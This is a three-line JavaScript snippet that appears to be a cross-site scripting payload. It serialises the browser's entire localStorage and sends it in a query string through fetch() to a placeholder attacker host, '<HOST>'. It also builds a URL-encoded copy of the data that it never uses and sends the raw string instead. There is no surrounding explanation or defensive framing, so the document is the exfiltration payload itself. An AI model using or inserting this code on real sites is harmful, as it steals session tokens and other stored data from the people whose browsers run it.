let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://<HOST>/?data=" + data)
